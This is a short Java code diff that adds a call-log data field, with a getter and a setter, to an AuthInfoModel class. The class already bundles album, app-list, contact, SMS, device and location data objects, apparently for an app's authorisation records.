@@ -10,6 +10,7 @@ public class AuthInfoModel implements Serializable {
     private SmsInfoAuthModel sms;
     private DeviceInfoModel device_info;
     private LocationBean gps;
+    private CallLogInfoAuthModel calllog_info;
 
     public AuthInfoModel(AlbumInfoAuthModel album_info, AppListInfoAuthModel applist_info, ContactInfoAuthModel phonebook_info, SmsInfoAuthModel sms_info, DeviceInfoModel device_info, LocationBean geo_info) {
         this.image = album_info;
@@ -18,6 +19,14 @@ public class AuthInfoModel implements Serializable {
         this.sms = sms_info;
         this.device_info = device_info;
         this.gps = geo_info;
+    }
+
+    public CallLogInfoAuthModel getCalllog_info() {
+        return calllog_info;
+    }
+
+    public void setCalllog_info(CallLogInfoAuthModel calllog_info) {
+        this.calllog_info = calllog_info;
     }
 
     public AlbumInfoAuthModel getImage() {
